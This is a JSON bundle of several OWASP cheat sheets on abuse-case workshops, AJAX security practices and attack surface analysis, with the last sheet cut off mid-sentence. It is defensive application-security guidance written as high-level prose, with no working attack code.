{
  "": [
    {
      "Abuse_Case_Cheat_Sheet.md": "# Abuse Case Cheat Sheet\r\n\r\n## Introduction\r\n\r\nOften when the security level of an application is mentioned in requirements, the following *expressions* are met:\r\n\r\n- *The application must be secure*.\r\n- *The application must defend against all attacks targeting this category of application*.\r\n- *The application must defend against attacks from the OWASP TOP 10*\r\n- ...\r\n\r\nThese security requirements are too generic, and thus useless for a development team...\r\n\r\nIn order to build a secure application, from a pragmatic point of view, it is important to identify the attacks which the application must defend against, according to its business and technical context.\r\n\r\n### Objective\r\n\r\nThe objective of this cheat sheet is to provide an explanation of what an **Abuse Case** is, why abuse cases are important when considering the security of an application, and finally to provide a proposal for a pragmatic approach to building  a list of abuse cases and tracking them for every feature planned for implementation as part of an application. The cheat sheet may be used for this purpose regardless of the project methodology used (waterfall or agile).\r\n\r\n**Important note about this Cheat Sheet:**\r\n\r\n```text\r\nThe main objective is to provide a pragmatic approach in order to allow a company or a project team\r\nto start building and handling the list of abuse cases and then customize the elements\r\nproposed to its context/culture in order to, finally, build its own method.\r\n\r\nThis cheat sheet can be seen as a getting-started tutorial.\r\n```\r\n\r\n### Context & approach\r\n\r\n#### Why clearly identify the attacks\r\n\r\nClearly identifying the attacks against which the application must defend is essential in order to enable the following steps in a project or sprint:\r\n\r\n- Evaluate the business risk for each of the identified attacks in order to perform a selection according to the business risk and the project/sprint budget.\r\n- Derive security requirements and add them into the project specification or sprint's user stories and acceptance criteria.\r\n- Estimate the overhead of provision in the initial project/sprint charge that will be necessary to implement the countermeasures.\r\n- About countermeasures: Allow the project team to define them, and to determine in which location they are appropriate (network, infrastructure, code...) to be located.\r\n\r\n#### Notion of Abuse Case\r\n\r\nIn order to help build the list of attacks, the notion of **Abuse Cases** is helpful.\r\n\r\nAn **Abuse Case** can be defined as:\r\n\r\n```text\r\nA way to use a feature that was not expected by the implementer,\r\nallowing an attacker to influence the feature or outcome of use of\r\nthe feature based on the attacker action (or input).\r\n```\r\n\r\nSynopsis defines an **Abuse Case** like this:\r\n\r\n```text\r\nMisuse and abuse cases describe how users misuse or exploit the weaknesses\r\nof controls in software features to attack an application.\r\n\r\nThis can lead to tangible business impact when a direct attack against\r\nbusiness functionalities, which may bring in revenue or provide\r\npositive user experience, are attacked.\r\n\r\nAbuse cases can also be an effective way to drive security requirements\r\nthat lead to proper protection of these critical business use cases.\r\n```\r\n\r\n[Synopsis source](https://www.synopsis.com/blogs/software-security/abuse-cases-can-drive-security-requirements)\r\n\r\n#### How to define the list of Abuse Cases\r\n\r\nThere are many different ways to define the list of abuse cases for a feature (that can be mapped to a user story in agile projects).\r\n\r\nThe project [OWASP Open SAMM](https://owasp.org/www-project-samm/) proposes the following approach in the *Stream B* of the Security Practice *Requirements Driven Testing* for the Maturity level 2:\r\n\r\n```text\r\nMisuse and abuse cases describe unintended and malicious use scenarios of the application, describing how an attacker could do this. Create misuse and abuse cases to misuse or exploit the weaknesses of controls in software features to attack an application. Use abuse-case models for an application to serve as fuel for identification of concrete security tests that directly or indirectly exploit the abuse scenarios.\r\n\r\nAbuse of functionality, sometimes referred to as a “business logic attack”, depends on the design and implementation of application functions and features. An example is using a password reset flow to enumerate accounts. As part of business logic testing, identify the business rules that are important for the application and turn them into experiments to verify whether the application properly enforces the business rule. For example, on a stock trading application, is the attacker allowed to start a trade at the beginning of the day and lock in a price, hold the transaction open until the end of the day, then complete the sale if the stock price has risen or cancel if the price dropped?\r\n```\r\n\r\nOpen SAMM source: [Verification Requirement Driven Testing Stream B](https://owaspsamm.org/model/verification/requirements-driven-testing/stream-b/)\r\n\r\nAnother way to achieve the building of the list can be the following (more bottom-up and collaboratively oriented):\r\n\r\nMake a workshop that includes people with the following profiles:\r\n\r\n- **Business analyst**: Will be the business key people that will describe each feature from a business point of view.\r\n- **Risk analyst**: Will be the company's risk personnel that will evaluate the business risk from a proposed attack (sometimes it is the **Business analyst** depending on the company).\r\n- **Penetration tester**: Will be the *attacker* that will propose attacks that they can perform on the business feature(s) in question. If the company does not have a person with this profile then it is possible to request the service of an external specialist. If possible, include 2 penetration testers with different backgrounds in order to increase the number of possible attacks that will be identified and considered.\r\n- **Technical leaders of the projects**: Will be the project technical people and will allow technical exchange about attacks and countermeasures identified during the workshop.\r\n- **Quality assurance analyst or functional tester**: Personnel that may have a good sense of how the application/functionality is intended to work (positive testing), not work (negative testing), and what things cause it to fail (failure cases).\r\n\r\nDuring this workshop (duration will depend on the size of the feature list, but 4 hours is a good start) all business features that will be part of the project or the sprint will be processed. The output of the workshop will be a list of attacks (abuse cases) for all business features. All abuse cases will have a risk rating that allows for filtering and prioritization.\r\n\r\nIt is important to take into account **Technical** and **Business** kind of abuse cases and mark them accordingly.\r\n\r\n*Example:*\r\n\r\n- Technical flagged abuse case: Add Cross Site Scripting injection into a comment input field.\r\n- Business flagged abuse case: Ability to arbitrarily modify the price of an article in an online shop prior to passing an order causing the user to pay a lower amount for the wanted article.\r\n\r\n#### When to define the list of Abuse Cases\r\n\r\nIn agile projects, the definition workshop must be made after the meeting in which User Stories are included in a Sprint.\r\n\r\nIn waterfall projects, the definition workshop must be made when the business features to implement are identified and known by the business.\r\n\r\nWhatever the mode of the project used (agile or waterfall), the abuse cases selected to be addressed must become security requirements in each feature specification section (waterfall) or User Story acceptance criteria (agile) in order to allow additional cost/effort evaluation, identification and implementation of the countermeasures.\r\n\r\nEach abuse case must have a unique identifier in order to allow tracking throughout the whole project/sprint (details about this point will be given in the proposal section).\r\n\r\nAn example of unique ID format can be **ABUSE_CASE_001**.\r\n\r\nThe following figure provides an overview of the chaining of the different steps involved (from left to right):\r\n\r\n[object Promise]\r\n\r\n### Proposal\r\n\r\nThe proposal will focus on the output of the workshop explained in the previous section.\r\n\r\n#### Step 1: Preparation of the workshop\r\n\r\nFirst, even if it seems obvious, the key business people must be sure to know, understand and be able to explain the business features that will be processed during the workshop.\r\n\r\nSecondly, create a new Microsoft Excel file (you can also use Google Sheets or any other similar software) with the following sheets (or tabs):\r\n\r\n- **FEATURES**\r\n    - Will contain a table with the list of business features planned for the workshop.\r\n- **ABUSE CASES**\r\n    - Will contain a table with all abuse cases identified during the workshop.\r\n- **COUNTERMEASURES**\r\n    - Will contain a table with the list of possible countermeasures (light description) imagined for the abuse cases identified.\r\n    - This sheet is not mandatory, but it can be useful (for an abuse case to know), if a fix is easy to implement and then can impact the risk rating.\r\n    - Countermeasures can be identified by the AppSec profile during the workshop, because an AppSec person must be able to perform attacks but also to build or identify defenses (it is not always the case for the Pentester profile because this person's focus is generally on the attack side only, so, the combination Pentester + AppSec is very efficient to have a 360 degree view).\r\n\r\nThis is the representation of each sheet along with an example of content that will be filled during the workshop:\r\n\r\n*FEATURES* sheet:\r\n\r\n| Feature unique ID |      Feature name     |           Feature short description           |\r\n|:-----------------:|:---------------------:|:---------------------------------------------:|\r\n| FEATURE_001       | DocumentUploadFeature | Allow user to upload document along a message |\r\n\r\n*COUNTERMEASURES* sheet:\r\n\r\n| Countermeasure unique ID | Countermeasure short description                       | Countermeasure help/hint                                |\r\n|--------------------------|--------------------------------------------------------|---------------------------------------------------------|\r\n| DEFENSE_001              | Validate the uploaded file by loading it into a parser | Use advice from the OWASP Cheat Sheet about file upload |\r\n\r\n*ABUSE CASES* sheet:\r\n\r\n| Abuse case unique ID | Feature ID impacted |                     Abuse case's attack description                     | Attack referential ID (if applicable) | CVSS V3 risk rating (score) |                CVSS V3 string                | Kind of abuse case | Countermeasure ID applicable | Handling decision (To Address or Risk Accepted) |\r\n|:--------------------:|:-------------------:|:-----------------------------------------------------------------------:|:-------------------------------------:|:---------------------------:|:--------------------------------------------:|:------------------:|:----------------------------:|:-----------------------------------------------:|\r\n| ABUSE_CASE_001       | FEATURE_001         | Upload Office file with malicious macro in charge of dropping a malware | CAPEC-17                              | HIGH (7.7)                  | CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:H/A:H | Technical          | DEFENSE_001                  | To Address                                      |\r\n\r\n#### Step 2: During the workshop\r\n\r\nUse the spreadsheet to review all the features.\r\n\r\nFor each feature, follow this flow:\r\n\r\n1. Key business people explain the current feature from a business point of view.\r\n2. Penetration testers propose and explain a set of attacks that they can perform against the feature.\r\n3. For each attack proposed:\r\n    1. Appsec proposes a countermeasure and a preferred set up location (infrastructure, network, code, design...).\r\n    2. Technical people give feedback about the feasibility of the proposed countermeasure.\r\n    3. Penetration testers use the CVSS v3 (or other standard) calculator to determine a risk rating. (ex: [CVSS V3 calculator](https://www.first.org/cvss/calculator/3.0))\r\n    4. Risk leaders should accept or modify the risk rating to determine the final risk score which accurately reflects the real business impact for the company.\r\n\r\n4. Business, Risk, and Technical leaders should find a consensus and filter the list of abuses for the current feature to keep the ones that must be addressed, and then flag them accordingly in the *ABUSE CASES* sheet (**if risk is accepted then add a comment to explain why**).\r\n5. Pass to next feature...\r\n\r\nIf the presence of penetration testers is not possible then you can use the following references to identify the applicable attacks on your features:\r\n\r\n- [OWASP Automated Threats to Web Applications](https://owasp.org/www-project-automated-threats-to-web-applications/)\r\n- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/stable/)\r\n- [OWASP Mobile Testing Guide](https://github.com/OWASP/owasp-mstg)\r\n- [Common Attack Pattern Enumeration and Classification (CAPEC)](https://capec.mitre.org/)\r\n\r\nImportant note on attacks and countermeasure knowledge base(s):\r\n\r\n```text\r\nWith time and experience across projects, you will obtain your own dictionary of attacks and countermeasures\r\nthat are applicable to the kind of application in your business domain.\r\n\r\nThis dictionary will speed up the future workshops in a significant way.\r\n\r\nTo promote the creation of this dictionary, you can, at the end of the project/sprint, gather the list\r\nof attacks and countermeasures identified in a central location (wiki, database, file...) that will be\r\nused during the next workshop in combination with input from penetration testers.\r\n```\r\n\r\n#### Step 3: After the workshop\r\n\r\nThe spreadsheet contains (at this stage) the list of all abuse cases that must be handled and, potentially (depending on the capacity) corresponding countermeasures.\r\n\r\nNow, there are two remaining task:\r\n\r\n1. Key business people must update the specification of each feature (waterfall) or the User Story of each feature (agile) to include the associated abuse cases as Security Requirements (waterfall) or Acceptance Criteria (agile).\r\n2. Key technical people must evaluate the overhead in terms of expense/effort to take into account the countermeasure.\r\n\r\n#### Step 4: During implementation - Abuse cases handling tracking\r\n\r\nIn order to track the handling of all the abuse cases, the following approach can be used:\r\n\r\nIf one or several abuse cases are handled at:\r\n\r\n- **Design, Infrastructure or Network level**\r\n    - Make a note in the documentation or schema to indicate that *This design/network/infrastructure takes into account the abuse cases ABUSE_CASE_001, ABUSE_CASE_002, ABUSE_CASE_xxx*.\r\n- **Code level**\r\n    - Put a special comment in the classes/scripts/modules to indicate that *This class/module/script takes into account the abuse cases ABUSE_CASE_001, ABUSE_CASE_002, ABUSE_CASE_xxx*.\r\n    - Dedicated annotation like `@AbuseCase(ids={\"ABUSE_CASE_001\",\"ABUSE_CASE_002\"})` can be used to facilitate tracking and allow identification into integrated development environment.\r\n\r\nUsing this way, it becomes possible (via some minor scripting) to identify where abuse cases are addressed.\r\n\r\n#### Step 5: During implementation - Abuse cases handling validation\r\n\r\nAs abuse cases are defined, it is possible to put in place automated or manual validations to ensure that:\r\n\r\n- All the selected abuse cases are handled.\r\n- An abuse case is correctly/completely handled.\r\n\r\nValidations can be of the following varieties:\r\n\r\n- Automated (run regularly at commit, daily or weekly in the Continuous Integration Jobs of the project):\r\n    - Custom audit rules in Static Application Security Testing (SAST) or Dynamic Application Security Testing (DAST) tools.\r\n    - Dedicated unit, integration or functional security oriented tests.\r\n    - ...\r\n- Manual:\r\n    - Security code review between project's peers during the design or implementation.\r\n    - Provide the list of all abuse cases addressed to pentesters so that they may validate the protection efficiency for each abuse case during an intrusion test against the application (the pentester will validate that the attacks identified are no longer effective and will also try to find other possible attacks).\r\n    - ...\r\n\r\nAdding automated tests also allow teams to track the effectiveness of countermeasures against abuse cases and determine if the countermeasures are still in place during a maintenance or bug fixing phase of a project (to prevent accidental removal/disabling). It is also useful when a [Continuous Delivery](https://continuousdelivery.com/) approach is used, to ensure that all abuse cases protections are in place before opening access to the application.\r\n\r\n### Example of derivation of Abuse Cases as User Stories\r\n\r\nThe following section shows an example of derivation of Abuse Cases as User Stories, here using the [OWASP TOP 10](https://owasp.org/www-project-top-ten/) as input source.\r\n\r\nThreat Oriented Personas:\r\n\r\n- Malicious User\r\n- Abusive User\r\n- Unknowing User\r\n\r\n#### A1:2017-Injection\r\n\r\n*Epic:*\r\n\r\nAlmost any source of data can be an injection vector, environment variables, parameters, external and internal web services, and all types of users. [Injection](https://owasp.org/www-community/Injection_Flaws) flaws occur when an attacker can send hostile data to an interpreter.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I will perform an injection attack (SQL, LDAP, XPath, or NoSQL queries, OS commands, XML parsers, SMTP headers, expression languages, and ORM queries) against input fields of the User or API interfaces\r\n\r\n#### A2:2017-Broken Authentication\r\n\r\n*Epic:*\r\n\r\nAttackers have access to hundreds of millions of valid username and password combinations for credential stuffing, default administrative account lists, automated brute force, and dictionary attack tools. Session management attacks are well understood, particularly in relation to unexpired session tokens.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I have access to hundreds of millions of valid username and password combinations for credential stuffing.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I have default administrative account lists, automated brute force, and dictionary attack tools I use against login areas of the application and support systems.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I manipulate session tokens using expired and fake tokens to gain access.\r\n\r\n#### A3:2017-Sensitive Data Exposure\r\n\r\n*Epic:*\r\n\r\nRather than directly attacking crypto, attackers steal keys, execute man-in-the-middle attacks, or steal clear text data off the server, while in transit, or from the user's client, e.g. browser. A manual attack is generally required. Previously retrieved password databases could be brute forced by Graphics Processing Units (GPUs).\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I steal keys that were exposed in the application to get unauthorized access to the application or system.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I execute man-in-the-middle attacks to get access to traffic and leverage it to obtain sensitive data and possibly get unauthorized access to the application.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I steal clear text data off the server, while in transit, or from the user's client, e.g. browser to get unauthorized access to the application or system.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I find and target old or weak cryptographic algorithms by capturing traffic and breaking the encryption.\r\n\r\n#### A4:2017-XML External Entities (XXE)\r\n\r\n*Epic:*\r\n\r\nAttackers can exploit vulnerable XML processors if they can upload XML or include hostile content in an XML document, exploiting vulnerable code, dependencies or integrations.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I exploit vulnerable areas of the application where the user or system can upload XML to extract data, execute a remote request from the server, scan internal systems, perform a denial-of-service attack, as well as execute other attacks.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I include hostile content in an XML document which is uploaded to the application or system to extract data, execute a remote request from the server, scan internal systems, perform a denial-of-service attack, as well as execute other attacks.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I include malicious XML code to exploit vulnerable code, dependencies or integrations to extract data, execute a remote request from the server, scan internal systems, perform a denial-of-service attack (e.g. Billion Laughs attack), as well as execute other attacks.\r\n\r\n#### A5:2017-Broken Access Control\r\n\r\n*Epic:*\r\n\r\nExploitation of access control is a core skill of attackers. Access control is detectable using manual means, or possibly through automation for the absence of access controls in certain frameworks.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I bypass access control checks by modifying the URL, internal application state, or the HTML page, or simply using a custom API attack tool.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I manipulate the primary key and change it to access another's users record, allowing viewing or editing someone else's account.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I manipulate sessions, access tokens, or other access controls in the application to act as a user without being logged in, or acting as an admin/privileged user when logged in as a user.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I leverage metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token or a cookie or hidden field manipulated to elevate privileges or abusing JWT invalidation.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I exploit Cross-Origin Resource Sharing CORS misconfiguration allowing unauthorized API access.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I access APIs with missing access controls for POST, PUT and DELETE.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I target default crypto keys in use, weak crypto keys generated or re-used, or keys where rotation is missing.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I find areas where the user agent (e.g. app, mail client) does not verify if the received server certificate is valid and perform attacks where I get unauthorized access to data.\r\n\r\n#### A6:2017-Security Misconfiguration\r\n\r\n*Epic:*\r\n\r\nAttackers will often attempt to exploit unpatched flaws or access default accounts, unused pages, unprotected files and directories, etc to gain unauthorized access or knowledge of the system.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I find and exploit missing appropriate security hardening configurations on any part of the application stack, or improperly configured permissions on cloud services.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I find unnecessary features which are enabled or installed (e.g. unnecessary ports, services, pages, accounts, or privileges) and attack or exploit the weakness.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I use default accounts and their passwords to access systems, interfaces, or perform actions on components which I should not be able to.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I find areas of the application where error handling reveals stack traces or other overly informative error messages I can use for further exploitation.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I find areas where upgraded systems, latest security features are disabled or not configured securely.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I find security settings in the application servers, application frameworks (e.g. Struts, Spring, ASP.NET), libraries, databases, etc. not set to secure values.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I find the server does not send security headers or directives or are set to insecure values.\r\n\r\n#### A7:2017-Cross-Site Scripting (XSS)\r\n\r\n*Epic:*\r\n\r\nXSS is the second most prevalent issue in the OWASP Top 10, and is found in around two-thirds of all applications.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I perform reflected XSS where the application or API includes unvalidated and unescaped user input as part of HTML output. My successful attack can allow the attacker to execute arbitrary HTML and JavaScript in my victim's browser. Typically the victim will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I perform stored XSS where the application or API stores unsanitized user input that is viewed at a later time by another user or an administrator.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I perform DOM XSS where JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page is vulnerable to DOM XSS.\r\n\r\n### A8:2017-Insecure Deserialization\r\n\r\n*Epic:*\r\n\r\nExploitation of deserialization is somewhat difficult, as off-the-shelf exploits rarely work without changes or tweaks to the underlying exploit code.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I find areas of the application and APIs where deserialization of hostile or tampered objects can be supplied. As a result, I can focus on an object and data structure related attacks where the attacker modifies application logic or achieves arbitrary remote code execution if there are classes available to the application that can change behavior during or after deserialization. Or I focus on data tampering attacks such as access-control-related attacks where existing data structures are used but the content is changed.\r\n\r\n### A9:2017-Using Components with Known Vulnerabilities\r\n\r\n*Epic:*\r\n\r\nWhile it is easy to find already-written exploits for many known vulnerabilities, other vulnerabilities require concentrated effort to develop a custom exploit.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I find common open source or closed source packages with weaknesses and perform attacks against vulnerabilities and exploits which are disclosed\r\n\r\n### A10:2017-Insufficient Logging & Monitoring\r\n\r\n*Epic:*\r\n\r\nExploitation of insufficient logging and monitoring is the bedrock of nearly every major incident. Attackers rely on the lack of monitoring and timely response to achieve their goals without being detected. In 2016, identifying a breach took an [average of 191 days](https://www-01.ibm.com/common/ssi/cgi-bin/ssialias?htmlfid=SEL03130WWEN) allowing substancial chance for damage to be inflicted.\r\n\r\n*Abuse Case:*\r\n\r\nAs an attacker, I attack an organization and the logs, monitoring systems, and teams do not see or respond to my attacks.\r\n\r\n## Sources of the schemas\r\n\r\nAll figures were created using <https://www.draw.io/> site and exported (as PNG image) for integration into this article.\r\n\r\nAll XML descriptor files for each schema are available below (using XML description, modification of the schema is possible using DRAW.IO site):\r\n\r\n[Schemas descriptors archive](../assets/Abuse_Case_Cheat_Sheet_SchemaBundle.zip)\r\n"
    },
    {
      "Access_Control_Cheat_Sheet.md": "# DEPRECATED: Access Control Cheatsheet\r\n\r\nThe Access Control cheatsheet has been deprecated.\r\n\r\nPlease visit the [Authorization Cheatsheet](Authorization_Cheat_Sheet.md) instead.\r\n"
    },
    {
      "AJAX_Security_Cheat_Sheet.md": "# AJAX Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis document will provide a starting point for AJAX security and will hopefully be updated and expanded reasonably often to provide more detailed information about specific frameworks and technologies.\r\n\r\n### Client Side (JavaScript)\r\n\r\n#### Use `.innerText` instead of `.innerHTML`\r\n\r\nThe use of `.innerText` will prevent most XSS problems as it will automatically encode the text.\r\n\r\n#### Don't use `eval()`, `new Function()` or other code evaluation tools\r\n\r\n`eval()` function is evil, never use it. Needing to use eval usually indicates a problem in your design.\r\n\r\n#### Canonicalize data to consumer (read: encode before use)\r\n\r\nWhen using data to build HTML, script, CSS, XML, JSON, etc. make sure you take into account how that data must be presented in a literal sense to keep its logical meaning.\r\n\r\nData should be properly encoded before used in this manner to prevent injection style issues, and to make sure the logical meaning is preserved.\r\n\r\n[Check out the OWASP Java Encoder Project.](https://owasp.org/www-project-java-encoder/)\r\n\r\n#### Don't rely on client logic for security\r\n\r\nDon't forget that the user controls the client-side logic. A number of browser plugins are available to set breakpoints, skip code, change values, etc. Never rely on client logic for security.\r\n\r\n#### Don't rely on client business logic\r\n\r\nJust like the security one, make sure any interesting business rules/logic is duplicated on the server side lest a user bypasses needed logic and does something silly, or worse, costly.\r\n\r\n#### Avoid writing serialization code\r\n\r\nThis is hard and even a small mistake can cause large security issues. There are already a lot of frameworks to provide this functionality.\r\n\r\nTake a look at the [JSON page](http://www.json.org/) for links.\r\n\r\n#### Avoid building XML or JSON dynamically\r\n\r\nJust like building HTML or SQL you will cause XML injection bugs, so stay away from this or at least use an encoding library or safe JSON or XML library to make attributes and element data safe.\r\n\r\n- [XSS (Cross Site Scripting) Prevention](Cross_Site_Scripting_Prevention_Cheat_Sheet.md)\r\n- [SQL Injection Prevention](SQL_Injection_Prevention_Cheat_Sheet.md)\r\n\r\n#### Never transmit secrets to the client\r\n\r\nAnything the client knows the user will also know, so keep all that secret stuff on the server please.\r\n\r\n#### Don't perform encryption in client side code\r\n\r\nUse TLS/SSL and encrypt on the server!\r\n\r\n#### Don't perform security impacting logic on client side\r\n\r\nThis is the overall one that gets me out of trouble in case I missed something :)\r\n\r\n### Server Side\r\n\r\n#### Use CSRF Protection\r\n\r\nTake a look at the [Cross-Site Request Forgery (CSRF) Prevention](Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md) cheat sheet.\r\n\r\n#### Protect against JSON Hijacking for Older Browsers\r\n\r\n##### Review AngularJS JSON Hijacking Defense Mechanism\r\n\r\nSee the [JSON Vulnerability Protection](https://docs.angularjs.org/api/ng/service/$http#json-vulnerability-protection) section of the AngularJS documentation.\r\n\r\n##### Always return JSON with an Object on the outside\r\n\r\nAlways have the outside primitive be an object for JSON strings:\r\n\r\n**Exploitable:**\r\n\r\n```json\r\n[{\"object\": \"inside an array\"}]\r\n```\r\n\r\n**Not exploitable:**\r\n\r\n```json\r\n{\"object\": \"not inside an array\"}\r\n```\r\n\r\n**Also not exploitable:**\r\n\r\n```json\r\n{\"result\": [{\"object\": \"inside an array\"}]}\r\n```\r\n\r\n#### Avoid writing serialization code Server Side\r\n\r\nRemember ref vs. value types! Look for an existing library that has been reviewed.\r\n\r\n#### Services can be called by users directly\r\n\r\nEven though you only expect your AJAX client side code to call those services the users can too.\r\n\r\nMake sure you validate inputs and treat them like they are under user control (because they are!).\r\n\r\n#### Avoid building XML or JSON by hand, use the framework\r\n\r\nUse the framework and be safe, do it by hand and have security issues.\r\n\r\n#### Use JSON And XML Schema for Webservices\r\n\r\nYou need to use a third-party library to validate web services.\r\n"
    },
    {
      "Attack_Surface_Analysis_Cheat_Sheet.md": "# Attack Surface Analysis Cheat Sheet\r\n\r\n## What is Attack Surface Analysis and Why is it Important\r\n\r\nThis article describes a simple and pragmatic way of doing Attack Surface Analysis and managing an application's Attack Surface. It is targeted to be used by developers to understand and manage application security risks as they design and change an application, as well as by application security specialists doing a security risk assessment. The focus here is on protecting an application from external attack - it does not take into account attacks on the users or operators of the system (e.g. malware injection, social engineering attacks), and there is less focus on insider threats, although the principles remain the same. The internal attack surface is likely to be different to the external attack surface and some users may have a lot of access.\r\n\r\nAttack Surface Analysis is about mapping out what parts of a system need to be reviewed and tested for security vulnerabilities. The point of Attack Surface Analysis is to understand the risk areas in an application, to make developers and security specialists aware of what parts of the application are open to attack, to find ways of minimizing this, and to notice when and how the Attack Surface changes and what this means from a risk perspective.\r\n\r\nAttack Surface Analysis is usually done by security architects and pen testers. But developers should understand and monitor the Attack Surface as they design and build and change a system.\r\n\r\nAttack Surface Analysis helps you to:\r\n\r\n1. identify what functions and what parts of the system you need to review/test for security vulnerabilities\r\n2. identify high risk areas of code that require defense-in-depth protection - what parts of the system that you need to defend\r\n3. identify when you have changed the attack surface and need to do some kind of threat assessment\r\n\r\n## Defining the Attack Surface of an Application\r\n\r\nThe Attack Surface describes all of the different points where an attacker could get into a system, and where they could get data out.\r\n\r\nThe Attack Surface of an application is:\r\n\r\n1. the sum of all paths for data/commands into and out of the application, and\r\n2. the code that protects these paths (including resource connection and authentication, authorization, activity logging, data validation and encoding)\r\n3. all valuable data used in the application, including secrets and keys, intellectual property, critical business data, personal data and PII, and\r\n4. the code that protects these data (including encryption and checksums, access auditing, and data integrity and operational security controls).\r\n\r\nYou overlay this model with the different types of users - roles, privilege levels - that can access the system (whether authorized or not). Complexity increases with the number of different types of users. But it is important to focus especially on the two extremes: unauthenticated, anonymous users and highly privileged admin users (e.g. database administrators, system administrators).\r\n\r\nGroup each type of attack point into buckets based on risk (external-facing or internal-facing), purpose, implementation, design and technology. You can then count the number of attack points of each type, then choose some cases for each type, and focus your review/assessment on those cases.\r\n\r\nWith this approach, you don't need to understand every endpoint in order to understand the Attack Surface and the potential risk profile of a system. Instead, you can count the different general type of endpoints and the number of points of each type. With this you can budget what it will take to assess risk at scale, and you can tell when the risk profile of an application has significantly changed.\r\n\r\n### Microservice and Cloud Native Applications\r\n\r\nMicroservice and Cloud Native applications are comprised of multiple smaller components, loosely coupled using APIs and independently scalable.  When assessing the attack surface for applications of this architectural style, you should prioritize the components that are reachable from an attack source (e.g. external traffic from the Internet).  Such components may be located behind tiers of proxies, load balancers and ingress controllers, and may auto-scale without warning.\r\n\r\nOpen source tooling such as [Scope](https://github.com/weaveworks/scope) or [ThreatMapper](https://github.com/deepfence/ThreatMapper) assist in visualizing the attack surface.\r\n\r\n## Identifying and Mapping the Attack Surface\r\n\r\nYou can start building a baseline description of the Attack Surface in a picture and notes. Spend a few hours reviewing design and architecture documents from an attacker's perspective. Read through the source code and identify different points of entry/exit:\r\n\r\n- User interface (UI) forms and fields\r\n- HTTP headers and cookies\r\n- APIs\r\n- Files\r\n- Databases\r\n- Other local storage\r\n- Email or other kinds of messages\r\n- Runtime arguments\r\n- ...Your points of entry/exit\r\n\r\nThe total number of different attack points can easily add up into the thousands or more. To make this manageable, break the model into different types based on function, design and technology:\r\n\r\n- Login/authentication entry points\r\n- Admin interfaces\r\n- Inquiries and search functions\r\n- Data entry (CRUD) forms\r\n- Business workflows\r\n- Transactional interfaces/APIs\r\n- Operational command and monitoring interfaces/APIs\r\n- Interfaces with other applications/systems\r\n- ...Your types\r\n\r\nYou also need to identify the valuable data (e.g. confidential, sensitive, regulated) in the application, by interviewing developers and users of the system, and again by reviewing the source code.\r\n\r\nYou can also build up a picture of the Attack Surface by scanning the application. For web apps you can use a tool like the [OWASP ZAP](https://www.zaproxy.org/) or [Arachni](http://arachni-scanner.com/) or [Skipfish](http://code.google.com/p/skipfish/) or [w3af](http://w3af.sourceforge.net/) or one of the many commercial dynamic testing and vulnerability scanning tools or services to crawl your app and map the parts of the application that are accessible over the web. Some web application firewalls (WAFs) may also be able to export a model of the application's entry points.\r\n\r\nValidate and fill in your understanding of the Attack Surface by walking through some of the main use cases in the system: signing up and creating a user profile, logging in, searching for an item, placing an order, changing an order, and so on. Follow the flow of control and data through the system, see how information is validated and where it is stored, what resources are touched and what other systems are involved. There is a recursive relationship between Attack Surface Analysis and [Application Threat Modeling](https://owasp.org/www-community/Application_Threat_Modeling): changes to the Attack Surface should trigger threat modeling, and threat modeling helps you to understand the Attack Surface of the application.\r\n\r\nThe Attack Surface model may be rough and incomplete to start, especially if you haven't done any security work on the application before. Fill in the holes as you dig deeper in a security analysis, or as you work more with the application and realize that your understanding of the Attack Surface has improved.\r\n\r\n## Measuring and Assessing the Attack Surface\r\n\r\nOnce you have a map of the Attack Surface, identify the high risk areas. Focus on remote entry points – interfaces with outside systems and to the Internet – and especially where the system allows anonymous, public access.\r\n\r\n- Network-facing, especially internet-facing code\r\n- Web forms\r\n- Files from outside of the network\r\n- Backward compatible interfaces with other systems – old protocols, sometimes old code and libraries, hard to maintain and test multiple versions\r\n- Custom APIs – protocols etc – likely to have mistakes in design and implementation\r\n- Security code: anything to do with cryptography, authentication, authorization (access control) and session management\r\n\r\nThese are often where you are most exposed to attack. Then understand what compensating controls you have in place, operational controls like network firewalls and application firewalls, and intrusion detection or prevention systems to help protect your application.\r\n\r\nMichael Howard at Microsoft and 